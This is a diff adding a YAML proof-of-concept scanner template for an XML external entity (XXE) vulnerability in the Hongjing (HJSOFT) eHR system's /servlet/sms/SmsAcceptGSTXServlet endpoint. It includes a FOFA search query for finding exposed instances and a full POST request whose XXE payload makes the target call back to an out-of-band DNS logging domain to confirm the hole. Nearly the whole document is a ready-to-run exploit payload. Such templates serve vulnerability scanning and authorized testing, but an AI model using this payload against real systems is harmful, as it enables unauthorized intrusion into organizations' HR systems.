@@ -1,0 +1,27 @@
+id: poc-yaml-hjsoft-ehr-servlet-sms-smsacceptgstxservlet-xxe
+info:
+  name: 宏景HR系统 /servlet/sms/SmsAcceptGSTXServlet XML实体注入
+  severity: critical
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /servlet/sms/SmsAcceptGSTXServlet
+  headers:
+    Content-Type: text/xml
+  data: <?xml version="1.0" ?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM "http://{{.domain}}">]><r><a>&sp;</a
+    ></r>
+  expression: 'status_code == 200 &&
+
+    contains(body,"ZWTSMSMessage") &&
+
+    reverse.Sleep(3)
+
+    '
+transport: http
